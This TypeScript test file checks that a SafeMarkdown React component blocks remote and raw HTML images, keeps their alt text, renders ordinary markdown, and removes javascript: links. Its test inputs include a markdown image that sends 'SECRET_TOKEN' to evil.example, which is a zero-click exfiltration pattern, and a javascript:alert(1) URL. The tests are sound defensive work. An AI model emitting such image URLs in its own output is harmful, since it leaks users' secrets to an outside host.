import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { renderToStaticMarkup } from 'react-dom/server';
import { SafeMarkdown } from './SafeMarkdown';

const html = (md: string) => renderToStaticMarkup(<SafeMarkdown text={md} />);

describe('SafeMarkdown', () => {
  it('never emits an <img> for a remote markdown image (zero-click exfiltration channel)', () => {
    const out = html('hello ![](https://evil.example/?d=SECRET_TOKEN)');
    assert.equal(out.includes('<img'), false);
    assert.equal(out.includes('src='), false);
  });

  it('does not emit raw HTML images either', () => {
    assert.equal(html('<img src="https://evil.example/x.png">').includes('<img'), false);
  });

  it('keeps the alt text so the reader knows something was blocked', () => {
    assert.match(html('![diagram](https://evil.example/a.png)'), /diagram/);
  });

  it('still renders ordinary markdown', () => {
    const out = html('**bold** and `code`');
    assert.match(out, /<strong>bold<\/strong>/);
    assert.match(out, /<code>code<\/code>/);
  });

  it('makes links safe to open (no opener, no referrer) and drops javascript: URLs', () => {
    const out = html('[a](https://example.com) [b](javascript:alert(1))');
    assert.match(out, /rel="noopener noreferrer"/);
    assert.equal(out.includes('javascript:'), false);
  });
});
